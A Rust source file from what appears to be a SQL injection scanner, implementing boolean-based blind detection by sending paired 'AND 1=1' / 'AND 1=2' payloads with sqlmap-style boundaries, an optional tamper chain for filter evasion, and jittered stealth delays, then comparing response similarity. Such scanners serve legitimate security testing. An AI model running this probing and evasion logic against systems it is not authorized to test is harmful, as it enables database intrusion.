//! Boolean-based blind SQL injection technique.

use std::time::Duration;
use tracing::{debug, info};

use crate::sqx::{
    detector::SqliDetector,
    evasion::tamper_chain::TamperChain,
    models::{HttpResponse, SqliTestResult, SqliTechnique},
    payload_fetcher::DynamicPayloads,
    similarity::calculate_similarity,
};

impl SqliDetector {
    /// Test for boolean-based blind SQL injection
    pub(crate) async fn test_boolean_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
        tamper: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        debug!("Testing boolean-based blind SQL injection on parameter: {}", param);

        let is_numeric = original_value.parse::<i64>().is_ok();

        // 1. Built-in fast path (static boundaries)
        let boundaries = crate::sqx::payload_fetcher::BOUNDARIES;
        for boundary in boundaries.iter() {
            if !is_numeric && boundary.close.is_empty() { continue; }

            let true_payload  = format!("{}{} AND 1=1 {}",
                original_value, boundary.close, boundary.balance);
            let false_payload = format!("{}{} AND 1=2 {}",
                original_value, boundary.close, boundary.balance);

            if let Some(result) = self.try_boolean_pair(
                url, param, original_value, baseline, tamper,
                &true_payload, &false_payload, boundary.label, None
            ).await {
                return Some(result);
            }
        }

        // 2. Dynamic sqlmap payloads path
        let dynamic = crate::sqx::payload_fetcher::DynamicPayloads::load();
        
        // Filter boolean blind tests (stype=1)
        let tests: Vec<_> = dynamic.tests.iter().filter(|t| t.stype == 1).collect();
        
        for test in tests {
            if test.level > 3 { continue; }

            for boundary in &dynamic.boundaries {
                // Clause compatibility
                if !test.clause.is_empty() && !boundary.clause.is_empty() {
                    if !test.clause.iter().any(|tc| boundary.clause.contains(tc)) {
                        continue;
                    }
                }

                // Where compatibility — pick first common where bit
                let where_bit = if test.where_clause.is_empty() || boundary.where_clause.is_empty() {
                    1u8
                } else {
                    boundary.where_clause.iter()
                        .find(|bw| test.where_clause.contains(bw))
                        .copied()
                        .unwrap_or(1)
                };

                let true_payload = self.apply_sqlmap_boundary(
                    original_value, &test.request_payload, boundary, where_bit, "1=1"
                );
                let false_payload = self.apply_sqlmap_boundary(
                    original_value, &test.request_payload, boundary, where_bit, "1=2"
                );

                if true_payload == false_payload { continue; }

                if let Some(result) = self.try_boolean_pair(
                    url, param, original_value, baseline, tamper,
                    &true_payload, &false_payload, &format!("dyn:{}", boundary.prefix), Some(&test.title)
                ).await {
                    return Some(result);
                }
            }
        }

        None
    }

    /// Apply sqlmap boundary respecting the <where> semantics.
    /// where_bit: 1=append, 2=inline, 3=replace
    fn apply_sqlmap_boundary(
        &self,
        original: &str,
        payload_template: &str,
        boundary: &crate::sqx::payload_fetcher::SqlmapBoundary,
        where_bit: u8,
        inference: &str,
    ) -> String {
        let prefix = DynamicPayloads::resolve_placeholders(&boundary.prefix, 42, "sqx", original, inference, 5);
        let suffix = DynamicPayloads::resolve_placeholders(&boundary.suffix, 42, "sqx", original, inference, 5);
        let payload = DynamicPayloads::resolve_placeholders(payload_template, 42, "sqx", original, inference, 5);

        match where_bit {
            2 => format!("{}{}{}", prefix, payload, suffix), // inline
            3 => format!("{}{}{}", prefix, payload, suffix), // replace
            _ => format!("{}{}{}{}", original, prefix, payload, suffix), // append (default)
        }
    }

    /// Test a single TRUE/FALSE payload pair. Returns a finding if gap > 0.02.
    async fn try_boolean_pair(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
        tamper: Option<&TamperChain>,
        true_payload: &str,
        false_payload: &str,
        ctx: &str,
        payload_id: Option<&str>,
    ) -> Option<SqliTestResult> {
        let true_eff  = tamper.map(|t| t.apply(true_payload )).unwrap_or_else(|| true_payload .to_string());
        let false_eff = tamper.map(|t| t.apply(false_payload)).unwrap_or_else(|| false_payload.to_string());

        let true_url  = self.build_test_url(url, param, original_value, &true_eff);
        let true_resp = self.send_request(&true_url).await.ok()?;
        tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;

        let false_url  = self.build_test_url(url, param, original_value, &false_eff);
        let false_resp = self.send_request(&false_url).await.ok()?;

        let true_sim  = calculate_similarity(&baseline.body, &true_resp.body);
        let false_sim = calculate_similarity(&baseline.body, &false_resp.body);
        let gap = true_sim - false_sim;

        debug!("Boolean blind ctx={} true_sim={:.2} false_sim={:.2} gap={:.2}",
            ctx, true_sim, false_sim, gap);

        if true_sim > 0.9 && gap > 0.02 {
            info!("Boolean-based blind SQL injection found! (context={})", ctx);
            return Some(SqliTestResult {
                parameter: param.to_string(),
                technique: SqliTechnique::BooleanBlind,
                confidence: 0.85,
                payload: true_eff,
                evidence: format!(
                    "ctx={} TRUE sim={:.0}%, FALSE sim={:.0}%",
                    ctx, true_sim * 100.0, false_sim * 100.0
                ),
                dbms_hint: None,
                        injection_context: Some(ctx.to_string()),
                payload_id: payload_id.map(|s| s.to_string()),
            });
        }
        None
    }
}
